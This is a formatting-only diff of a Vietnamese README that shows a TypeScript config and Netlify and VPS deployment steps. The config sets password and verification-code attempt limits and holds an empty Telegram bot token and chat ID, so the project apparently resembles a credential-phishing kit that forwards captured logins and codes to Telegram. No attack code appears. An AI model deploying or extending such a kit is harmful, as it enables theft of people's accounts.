@@ -31,17 +31,17 @@
 
     ```typescript
     const config = {
-        settings: {
-            code_loading_time: 15000,
-            max_failed_code_attempts: 3,
-            max_failed_password_attempts: 2,
-            page_loading_time: 5000,
-            password_loading_time: 10000,
-        },
-        telegram: {
-            chatid: '',
-            token: '',
-        },
+    	settings: {
+    		code_loading_time: 15000,
+    		max_failed_code_attempts: 3,
+    		max_failed_password_attempts: 2,
+    		page_loading_time: 5000,
+    		password_loading_time: 10000,
+    	},
+    	telegram: {
+    		chatid: '',
+    		token: '',
+    	},
     };
 
     export default config;
@@ -49,7 +49,7 @@
 
 ## Triển Khai (Deploy) 🚀
 
-- **Tự Động Deploy:**
+-   **Tự Động Deploy:**
 
     Sau khi sửa đổi và commit thay đổi, chỉ cần đẩy các thay đổi lên remote repository bằng lệnh:
 
@@ -61,7 +61,7 @@
 
     Netlify sẽ tự động deploy. 🎉
 
-- **Triển Khai Thủ Công:**
+-   **Triển Khai Thủ Công:**
 
     Nếu muốn triển khai thủ công, cần phải xây dựng dự án trước khi triển khai. Sử dụng lệnh sau để xây dựng dự án:
 
@@ -75,8 +75,8 @@
 
 ## Yêu cầu ✅
 
-- Máy tính cần có `scp` để copy file vào VPS.
-- Cần có quyền truy cập SSH vào VPS của mình.
+-   Máy tính cần có `scp` để copy file vào VPS.
+-   Cần có quyền truy cập SSH vào VPS của mình.
 
 ## Bước 1: Copy tệp vào VPS 📂
 
@@ -98,27 +98,27 @@ scp -r C:\Users\tank\Desktop\LxixoeR4uy tank@192.168.1.100:/root
 
 1. Kết nối vào VPS qua SSH:
 
-   ```bash
-   ssh username@vps_address
-   ```
+    ```bash
+    ssh username@vps_address
+    ```
 
 2. Truy cập đến thư mục chứa các tệp đã copy:
 
-   ```bash
-   cd /root/LxixoeR4uy
-   ```
+    ```bash
+    cd /root/LxixoeR4uy
+    ```
 
 3. Thiết lập quyền thực thi cho tệp `setup.sh`:
 
-   ```bash
-   chmod +x setup.sh
-   ```
+    ```bash
+    chmod +x setup.sh
+    ```
 
 4. Chạy `setup.sh`:
 
-   ```bash
-   ./setup.sh
-   ```
+    ```bash
+    ./setup.sh
+    ```
 
 ## Copyright 📝
 
